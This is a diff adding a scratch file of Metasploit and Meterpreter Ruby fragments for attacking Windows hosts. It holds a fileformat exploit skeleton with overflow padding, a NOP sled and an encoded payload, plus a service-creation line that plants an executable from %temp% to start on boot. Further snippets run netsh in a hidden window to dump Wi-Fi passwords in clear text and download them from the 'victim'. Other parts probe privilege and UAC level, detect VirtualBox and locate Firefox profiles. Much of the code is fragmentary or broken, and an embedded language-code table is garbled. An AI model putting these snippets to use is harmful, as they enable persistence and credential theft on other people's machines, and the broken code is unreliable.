@@ -1,0 +1,583 @@
+# This is my imaginary exploit in ruby
+include Msf::Exploit::FILEFORMAT
+buf = ""
+buf << "A" * 1024
+buf << [0x40201f01].pack("V")
+buf << "\x90" * 10
+buf << payload.encoded
+file_create(buf)
+
+register_options(
+  [
+    OptString.new('FILENAME', [true, 'The malicious file name',  'msf.jpg'])
+  ], self.class)
+
+
+
+
+
+# write to local file
+File = file.open("/root/test", "w")
+File.write("sc create #{sname} binpath= \"%tmp%\\t.exe\" start= auto") 
+File.close
+
+#use backslash to escape double quotes
+("sc create #{sname} bin= \"%tmp%\\fg.exe\"") 
+
+
+# random name file
+rand = Rex::Text.rand_text_alpha(8)+".log"
+print_good("#{rand} file created")
+
+
+
+
+# check if file exists
+print_warning("check if file exists")
+path="%systemroot%\\system32\\ola.txt"
+if session.fs.file.exist?(path)
+
+
+# check if directory exists
+get_path = "C:\windows"
+ if session.fs.directory.exist?(#{get_path})
+      print_good('Vuln path exists')
+      CheckCode::Appears
+    else
+      vprint_error("#{get_path} doesn't exist on target")
+      CheckCode::Safe
+    end
+
+
+
+#Ruby function to check directory existence
+if(File.directory?('arjun')) 
+  puts 'Directory exists'
+else
+  puts 'Directory not found'
+end
+
+
+Syntax: client.fs.dir.mkdir("c:\\oldman")
+Output: 0
+Comment: This will make a directory named "oldman" in c drive.
+
+
+# List processes
+# We can access the list of processes from “session.sys.process” using “get_processes” method.
+# Print processes if it is requested
+if listprocesses == TRUE
+  print_status('Process list:')
+  print_line('')
+    session.sys.process.get_processes().each do |x|        
+    print_good("#{x['name']} [#{x['pid']}]")    
+    end
+  print_line('') 
+end
+
+
+
+# check if is a meterpreter session
+client = session
+if session.type != "meterpreter"
+  print_error "Only meterpreter sessions are supported on Windows hosts"
+  return
+end
+
+# check if is a meterpreter session
+print_status("Running module against #{sysnfo['Computer']}") if not sysinfo.nil? 
+
+
+# check if its system
+isadd = is_admin?
+if(isadd)
+print_line('we are admin') 
+else
+print_line('not admin access level') 
+end
+
+
+
+# check if its admin
+issys = is_system?
+if(issys)
+print_line('we are system') 
+else
+print_line('not a system access level') 
+end
+
+
+
+  # Returns true if UAC is enabled
+  #
+  # Returns false if the session is running as system, if uac is disabled or
+  # if running on a system that does not have UAC
+  #
+  def is_uac_enabled?
+    uac = false
+    winversion = session.sys.config.sysinfo['OS']
+
+    if winversion =~ /Windows (Vista|7|8|2008|2012)/
+      unless is_system?
+        begin
+          enable_lua = registry_getvaldata(
+              'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System',
+              'EnableLUA'
+          )
+          uac = (enable_lua == 1)
+        rescue Rex::Post::Meterpreter::RequestError => e
+          print_error("Error Checking if UAC is Enabled: #{e.class} #{e}")
+        end
+      end
+    end
+    return uac
+  end
+
+  #
+  # Returns the UAC Level
+  #
+  # @see http://technet.microsoft.com/en-us/library/dd835564(v=ws.10).aspx
+  # 2 - Always Notify, 5 - Default, 0 - Disabled
+  #
+  def get_uac_level
+    begin
+      uac_level = registry_getvaldata(
+          'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System',
+          'ConsentPromptBehaviorAdmin'
+      )
+    rescue Rex::Post::Meterpreter::RequestError => e
+      print_error("Error Checking UAC Level: #{e.class} #{e}")
+    end
+
+    if uac_level
+      return uac_level
+    else
+      return nil
+    end
+  end
+
+
+
+#
+# by darkoperator
+# check powershell version on target
+def checkps2
+  os = sysinfo['OS']
+  if os =~ /windows 2012|2016|7|8|10/
+    print_status('checking if ps2 engine its enable')
+    path = "HKLM\\SOFTWARE\\Microsoft\\Powershell\\1"
+    if registry_enumkeys(path).include?("PowerShellEngine")
+      if registry_getvaldata("#{path}\\PowerShellEngine", 'PowerShellVersion') == '2.0'
+        print_good("\tPowerShell 2.0 engine is enabled")
+        report_note(
+                :host  => session,
+                :type  => 'host.log.ps_v2_feature',
+                :data{
+                  :enabled => true},
+                :update => :unique_data
+             )
+
+      else
+        print_good("\tPowerShell 2.0 engine not enabled")
+                report_note(
+                :host  => session,
+                :type  => 'host.log.ps_v2_feature',
+                :data{
+                  :enabled => false},
+                :update => :unique_data
+             )
+      end
+    end
+  end
+end
+
+
+
+
+
+
+
+
+# display report note ???
+hpat = client.fs.file.expand_path("%HOMEPATH%")
+syhd = client.fs.file.expand_path("%SYSTEMDRIVE%")
+
+      report_note(
+        :host   => session,
+        :home   => #{hpat},
+        :system => #{syhd},
+        :update => :unique_data
+        )
+      print_status("This is a Sun VirtualBox Virtual Machine")
+      return "VirtualBox"
+    end
+  end
+
+
+
+
+
+Syntax: client.sys.config.sysinfo["System Language"]
+Output: "en_US"
+Comment: This will give operating system language of the compromised system.
+-----------
+REG QUERY HKLM\System\CurrentControlSet\Control\Nls\Language /v InstallLanguage
+0436 = "af;Afrikaans"
+041C = "sq;Albanian"
+0001 = "ar;Arabic"
+0401 = "ar-sa;Arabic (Saudi Arabia)"
+0801 = "ar-iq;Arabic (Iraq)"
+0C01 = "ar-eg;Arabic (Egypt)"
+1001 = "ar-ly;Arabic (Libya)"
+1401 = "ar-dz;Arabic (Algeria)"
+1801 = "ar-ma;Arabic (Morocco)"
+1C01 = "ar-tn;Arabic (Tunisia)"
+2001 = "ar-om;Arabic (Oman)"
+2401 = "ar-ye;Arabic (Yemen)"
+2801 = "ar-sy;Arabic (Syria)"
+2C01 = "ar-jo;Arabic (Jordan)"
+3001 = "ar-lb;Arabic (Lebanon)"
+3401 = "ar-kw;Arabic (Kuwait)"
+3801 = "ar-ae;Arabic (you.A.E.)"
+3C01 = "ar-bh;Arabic (Bahrain)"
+4001 = "ar-qa;Arabic (Qatar)"
+042D = "eu;Basque"
+0402 = "bg;Bulgarian"
+0423 = "be;Belarusian"
+0403 = "ca;Catalan"
+0004 = "zh;Chinese"
+0404 = "zh-tw;Chinese (Taiwan)"
+0804 = "zh-cn;Chinese (China)"
+0C04 = "zh-hk;Chinese (Hong Kong SAR)"
+1004 = "zh-sg;Chinese (Singapore)"
+041A = "hr;Croatian"
+0405 = "cs;Czech"
+0406 = "the;Danish"
+0413 = "nl;Dutch (Netherlands)"
+0813 = "nl-be;Dutch (Belgium)"
+0009 = "en;English"
+0409 = "en-us;English (United States)"
+0809 = "en-gb;English (United Kingdom)"
+0C09 = "en-au;English (Australia)"
+1009 = "en-ca;English (Canada)"
+1409 = "en-nz;English (New Zealand)"
+1809 = "en-ie;English (Ireland)"
+1C09 = "en-za;English (South Africa)"
+2009 = "en-jm;English (Jamaica)"
+2809 = "en-bz;English (Belize)"
+2C09 = "en-tt;English (Trinidad)"
+0425 = "et;Estonian"
+0438 = "fo;Faeroese"
+0429 = "fa;Farsi"
+040B = "fi;Finnish"
+040C = "fr;French (France)"
+080C = "fr-be;French (Belgium)"
+0C0C = "fr-ca;French (Canada)"
+100C = "fr-ch;French (Switzerland)"
+140C = "fr-lu;French (Luxembourg)"
+043C = "gd;Gaelic"
+0407 = "de;German (Germany)"
+0807 = "de-ch;German (Switzerland)"
+0C07 = "de-at;German (Austria)"
+1007 = "de-lu;German (Luxembourg)"
+1407 = "de-li;German (Liechtenstein)"
+0408 = "el;Greek"
+040D = "he;Hebrew"
+0439 = "hi;Hindi"
+040E = "hu;Hungarian"
+040F = "is;Icelandic"
+0421 = "in;Indonesian"
+0410 = "it;Italian (Italy)"
+0810 = "it-ch;Italian (Switzerland)"
+0411 = "ja;Japanese"
+0412 = "ko;Korean"
+0426 = "lv;Latvian"
+0427 = "lt;Lithuanian"
+042F = "mk;FYRO Macedonian"
+043E = "ms;Malay (Malaysia)"
+043A = "mt;Maltese" 0414 = "no;Norwegian (Bokmal)"
+0814 = "no;Norwegian (Nynorsk)"
+0415 = "pl;Polish"
+0416 = "pt-br;Portuguese (Brazil)"
+0816 = "pt;Portuguese (Portugal)"
+0417 = "rm;Rhaeto-Romanic"
+0418 = "ro;Romanian"
+0818 = "ro-mo;Romanian (Moldova)"
+0419 = "ru;Russian"
+0819 = "ru-mo;Russian (Moldova)"
+0C1A = "sr;Serbian (Cyrillic)"
+081A = "sr;Serbian (Latin)"
+041B = "sk;Slovak"
+0424 = "sl;Slovenian"
+042E = "sb;Sorbian"
+040A = "es;Spanish (Traditional Sort)"
+080A = "es-mx;Spanish (Mexico)"
+0C0A = "es;Spanish (International Sort)"
+100A = "es-gt;Spanish (Guatemala)"
+140A = "es-cr;Spanish (Costa Rica)"
+180A = "es-pa;Spanish (Panama)"
+1C0A = "es-do;Spanish (Dominican Republic)"
+200A = "es-ve;Spanish (Venezuela)"
+240A = "es-co;Spanish (Colombia)"
+280A = "es-pe;Spanish (Peru)"
+2C0A = "es-ar;Spanish (Argentina)"
+300A = "es-ec;Spanish (Ecuador)"
+340A = "es-cl;Spanish (Chile)"
+380A = "es-uy;Spanish (Uruguay)"
+3C0A = "es-py;Spanish (Paraguay)"
+400A = "es-bo;Spanish (Bolivia)"
+440A = "es-sv;Spanish (El Salvador)"
+480A = "es-hn;Spanish (Honduras)"
+4C0A = "es-ni;Spanish (Nicaragua)"
+500A = "es-pr;Spanish (Puerto Rico)"
+0430 = "sx;Sutu"
+041D = "sv;Swedish"
+081D = "sv-fi;Swedish (Finland)"
+041E = "th;Thai"
+0431 = "ts;Tsonga"
+0432 = "tn;Tswana"
+041F = "tr;Turkish"
+0422 = "uk;Ukrainian"
+0420 = "your;Urdu"
+042A = "vi;Vietnamese"
+0434 = "xh;Xhosa"
+043D = "ji;Yiddish"
+0435 = "zu;Zulu"
+-----------
+
+
+
+
+
+
+
+
+
+# ------------------------------------------
+# DUMP PASSWORD FROM SELECTED ESSID WLAN/LAN
+# ------------------------------------------
+def ls_stage3
+  inuse = datastore['INTERFACE']
+  essid = datastore['DUMP_ESSID']
+  dpath = datastore['DOWNLOAD_PATH']
+  lang = client.sys.config.sysinfo["System Language"]
+
+    if lang =~ /pt/
+      lag = key
+    else
+      lag = Chave
+    end
+
+    r=''
+    # execute cmd prompt in a hidden channelized windows!
+    # and build dump.log with results (dump) in target %temp% folder
+    # If we want to dump only password of ESSID and not he all profile use "key=clear | findstr Key"
+    r = session.sys.process.execute("cmd.exe /c netsh #{inuse} show profile #{essid} key=clear | findstr #{lag} > %temp%\\dump.log", nil, {'Hidden' => true, 'Channelized' => true})
+ 
+       # download 'dump.log' from target machine using one API call
+       print_status(" Dumping Credentials of: #{essid}")
+       client.fs.file.download("#{dpath}/dump.log","%temp%\\dump.log")
+
+    # close channel when done
+    r.channel.close
+    r.close
+
+  # error exception funtion
+  rescue ::Exception => e
+  print_error(" Error: #{e.class} #{e}")
+  print_error(" Try to rise meterpreter session to [nt authority/system] before runing this module")
+end
+
+
+
+
+
+
+
+# -------------------------------------------------------------
+
+
+  def check
+    vuln = false
+    winver = sysinfo["OS"]
+    affected = [ 'Windows Vista', 'Windows 7', 'Windows 2008' ]
+    affected.each { |v|
+      if winver.include? v
+        vuln = true
+        break
+      end
+
+
+
+
+
+# -------------------------------------------------------------------------------------------
+
+
+# List all the available interface from victims system
+
+Syntax: client.net.config.get_interfaces
+Output: [......]
+Comment: This will return an array of the first interface available in the victims system along with the details like IP, netmask, mac_address etc
+
+
+
+
+
+
+
+
+# ------------------------------------------------------------------------------------------
+# se... o command nao fizer o display do netsh
+# entao enviar o display para um log file
+# e fazer o download dele
+r = session.sys.process.execute("cmd.exe /c netsh interface show interface > %temp%\\dum.txt", nil, {'Hidden' => true, 'Channelized' => true})
+
+
+# Download file from victims system
+Syntax: client.fs.file.download("/root/dum.txt","%temp%\\dum.txt")
+Output: ["c:\\temp\\dum.txt"]
+Comment: This will download dum.txt from victims system and will save it to attackers root directory
+
+#Open a file in read mode and copy the content to some variable
+Syntax: file1 = client.fs.file.new("%temp%\\dum.txt")
+              vtemp = ""
+              until file1.eof?
+              vtemp << file_object.read
+Output: N.A
+Comment: This will copy all the data inside dum.txt and store it in vtemp variable
+
+
+# display variable to user
+print_good("    #{vtemp}")
+# print_line("\n" + vtemp.to_s + "\n")
+# -------------------------------------------------------------------------------------------
+
+
+
+
+# ------------------------------------------------------------------------------------------
+# try to fill a table ???
+# ------------------------------------------------------------------------------------------
+          # building table display
+          tbl = Rex::Ui::Text::Table.new(
+              'Header'  => 'Interfaces Active',
+              'Indent'  => 1,
+              'Columns' =>
+          [
+                      'wlan',
+                      'lan'
+          ])
+ 
+     # Gather target user data
+     file1 = client.fs.file.new("%temp%\\dum.txt")
+           vtemp = ""
+           until file1.eof?
+           vtemp << file.read
+ 
+     # Store in tables and print results on screen
+     tbl << [vtemp]
+     print_line("\n" + tbl.to_s + "\n")
+# ------------------------------------------------------------------------------------------
+
+
+# This sample demonstrates how a file can be encoded using a framework encoder.
+
+$:.unshift(File.join(File.dirname(__FILE__), ’..’, ’..’, ’..’,
+’lib’))
+require ’msf/base’
+if (ARGV.empty?)
+puts "Usage: #{File.basename(__FILE__)} encoder_name file_name format"
+exit
+end
+framework = Msf::Simple::Framework.create
+begin
+# Create the encoder instance.
+mod = framework.encoders.create(ARGV.shift)
+puts(Msf::Simple::Buffer.transform(
+mod.encode(IO.readlines(ARGV.shift).join), ARGV.shift || ’ruby’))
+rescue
+puts "Error: #{$!}\n\n#{$@.join("\n")}"
+end
+
+
+
+
+# ------------------------------------------------------------------------------------------
+
+    if not vm
+      if registry_getvaldata('HKLM\HARDWARE\DESCRIPTION\System','SystemBiosVersion') =~ /vbox/i
+        vm = true
+      end
+    end
+    if not vm
+      srvvals = registry_enumkeys('HKLM\SYSTEM\ControlSet001\Services')
+      if srvvals and srvvals.include?("VBoxMouse")
+        vm = true
+      elsif srvvals and srvvals.include?("VBoxGuest")
+        vm = true
+      elsif srvvals and srvvals.include?("VBoxService")
+        vm = true
+      elsif srvvals and srvvals.include?("VBoxSF")
+        vm = true
+      end
+    end
+    if vm
+      report_note(
+        :host   => session,
+        :type   => 'host.hypervisor',
+        :data   => { :hypervisor => "VirtualBox" },
+        :update => :unique_data
+        )
+      print_status("This is a Sun VirtualBox Virtual Machine")
+      return "VirtualBox"
+    end
+  end
+
+
+# ------------------------
+
+
+def check_firefox_win(path)
+    paths  = []
+    ffpath = []
+    path   = path + "\\Mozilla\\"
+    print_status("Checking for Firefox profile in: #{path}")
+
+    stat = session.fs.file.stat(path + "Firefox\\profiles.ini") rescue nil
+    if !stat
+      print_error("Firefox was not found (Missing profiles.ini)")
+      return
+    end
+
+    session.fs.dir.foreach(path) do |fdir|
+      #print_status("Found a Firefox directory: #{path + fdir}")
+      ffpath << path + fdir
+      break
+    end
+
+    if ffpath.empty?
+      print_error("Firefox was not found")
+      return
+    end
+
+    #print_status("Locating Firefox profiles")
+    path << "Firefox\\Profiles\\"
+
+    # We should only have profiles in the Profiles directory store them all
+    begin
+      session.fs.dir.foreach(path) do |pdirs|
+        next if pdirs == "." or pdirs == ".."
+        vprint_good("Found profile: #{path + pdirs}")
+        paths << path + pdirs
+      end
+    rescue
+      print_error("Profiles directory is missing")
+      return
+    end
+
+    paths.empty? ? (nil) : (paths)
+  end
+
+
+EOF
